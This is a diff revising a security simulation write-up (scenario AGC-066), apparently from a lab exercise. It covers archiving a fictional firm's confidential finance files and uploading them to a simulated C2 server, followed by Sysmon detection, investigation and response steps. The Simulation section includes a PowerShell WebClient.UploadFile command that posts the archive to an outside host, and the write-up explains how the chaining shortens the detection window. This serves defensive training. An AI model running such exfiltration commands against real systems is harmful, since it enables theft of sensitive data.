@@ -21,19 +21,19 @@
 
 ### Tradecraft
 
-**What:** Archive sensitive files into a compressed container, then immediately upload the archive to an external server. This two-phase operation (collection then exfiltration) executes within a single script, minimizing the window between data staging and data leaving the network.
+**What:** Zip the sensitive files, then upload the archive to the external server in the same script. Collection and exfiltration run back to back, so the staged data sits on disk for seconds, not hours.
 
 **Why an Attacker Uses It Here:**
-- Compression reduces the data volume for exfiltration (8 files consolidated into one 1,838-byte archive)
+- Compression shrinks the transfer (8 files became one 1,838-byte archive)
 - A single ZIP upload is less conspicuous than 8 individual file transfers
-- The archive-then-upload pattern completes in seconds, reducing the detection window
+- Archive-then-upload finishes in seconds, so the SOC has almost no window to react
 - The immediate upload means the staged archive never sits on disk long enough for scheduled scans to flag it
-- WebClient.UploadFile uses standard HTTP POST — blends with normal web traffic
+- WebClient.UploadFile is a plain HTTP POST, so it looks like ordinary web traffic
 
 **Relationship to prior scenarios:**
-- **AGC-057** demonstrated archive creation (T1560.001) as a standalone collection technique
-- **AGC-062** demonstrated HTTPS upload (T1041) as a standalone exfiltration technique
-- **AGC-066** chains both into a single unified operation, demonstrating how attackers combine techniques for operational efficiency
+- **AGC-057** ran archive creation (T1560.001) on its own
+- **AGC-062** ran the HTTPS upload (T1041) on its own
+- **AGC-066** chains both in one script, the way a real attacker would run them
 
 ### Simulation
 
@@ -63,7 +63,7 @@ $wc2 = New-Object System.Net.WebClient
 $wc2.UploadFile("http://10.10.40.10/upload", "C:\Windows\Temp\agc066_staged.zip")
 ```
 
-**Result:** Archive created (1,838 bytes). HTTPS upload succeeded (HTTP 200). HTTP fallback also succeeded (HTTP 200). Both responses returned HTML indicating server received the data.
+**Result:** Archive created (1,838 bytes). HTTPS upload succeeded (HTTP 200). HTTP fallback also succeeded (HTTP 200). Both responses carried HTML confirming the server received the data.
 
 ## SOC Perspective
 
@@ -121,7 +121,7 @@ DestinationPortName: http
 
 **Sysmon EID 11 — Archive file creation: 1 event detected** (ZIP file caught by Sysmon file creation monitoring).
 
-**ProcessGuid correlation:** All three events share ProcessGuid `{eb65e329-ce83-6aa9-cc04-000000001400}` (PID 5352), proving the archive creation and both uploads were performed by a single PowerShell process in one automated operation.
+**ProcessGuid correlation:** All three events share ProcessGuid `{eb65e329-ce83-6aa9-cc04-000000001400}` (PID 5352); one PowerShell process created the archive and ran both uploads.
 
 ### Investigation
 
@@ -147,10 +147,10 @@ The archived files represent Ashford Grove Capital's most sensitive financial re
 - Wire transfer logs (financial transaction records)
 - Client PII database export (regulated personal data)
 
-Exfiltration of this dataset would trigger mandatory breach notification under multiple regulations (SOX, GLBA, state privacy laws).
+Losing this dataset triggers mandatory breach notification under SOX, GLBA, and state privacy laws.
 
 **Step 3 — Exfiltration confirmation:**
-Both uploads received HTTP 200 responses with HTML content from the destination server. The C2 server at 10.10.40.10 (EXT-ATTACKER-SIM in the DMZ) accepted the uploaded archive. This is confirmed data exfiltration — not an attempt, but a completed breach.
+Both uploads got HTTP 200 responses with HTML bodies from the destination. The C2 server at 10.10.40.10 (EXT-ATTACKER-SIM in the DMZ) accepted the archive. The data left; this is a completed breach, not an attempt.
 
 **Step 4 — Cross-reference with prior scenarios:**
 This scenario reuses detection patterns from:
@@ -158,29 +158,29 @@ This scenario reuses detection patterns from:
 - **AGC-062**: WebClient.UploadFile to 10.10.40.10 (T1041) — same exfiltration method
 - **AGC-055/056**: PowerShell outbound to 10.10.40.10 — same C2 destination
 
-The combination into a single automated script demonstrates operational maturity — the attacker has evolved from individual techniques to chained operations.
+Running them as one script removes the pause between collection and upload that gave AGC-057 and AGC-062 separate detection chances.
 
 **Step 5 — Multi-protocol resilience:**
-The script uploaded via both HTTPS (443) and HTTP (80), demonstrating fallback capability. Even if one protocol were blocked, the data would still leave via the other. This is the same dual-protocol pattern observed in AGC-062.
+The script uploaded over both HTTPS (443) and HTTP (80). Block one protocol and the data still leaves over the other. AGC-062 used the same dual-protocol pattern.
 
 ### Report
 
 **Verdict: True Positive** — Confirmed data exfiltration via compressed archive upload.
 
-**Confidence: Critical** — The evidence chain is complete and irrefutable:
+**Confidence: Critical** — the evidence chain has no gaps:
 1. Archive creation of 8 confidential finance documents (T1560.001)
 2. Immediate HTTPS upload to known C2 server succeeded (T1041)
 3. HTTP fallback upload also succeeded — data exfiltrated twice
-4. ProcessGuid proves single-process automated operation
+4. ProcessGuid ties the archive and both uploads to one process
 5. Server acknowledged receipt (HTTP 200)
 6. Same destination IP (10.10.40.10) as prior confirmed C2 activity
 
 **Response recommendation:**
 1. **Declare data breach** — confidential financial records confirmed exfiltrated to attacker infrastructure
-2. **Isolate COMPROMISED-HOST-01** immediately — active exfiltration channel
+2. **Isolate COMPROMISED-HOST-01** immediately — the exfiltration channel is still open
 3. **Block 10.10.40.10** at the firewall on all protocols (HTTP, HTTPS, DNS)
 4. **Assess regulatory notification requirements** — payroll PII and client data trigger breach notification under GLBA and state privacy laws
-5. **Review all PowerShell execution** on COMPROMISED-HOST-01 for additional archive/upload patterns
+5. **Review all PowerShell execution** on COMPROMISED-HOST-01 for any other archive-then-upload sequences
 6. **Deploy DLP rules** — alert on Compress-Archive followed by outbound HTTP within 60 seconds from the same process
 
 ### MITRE Mapping
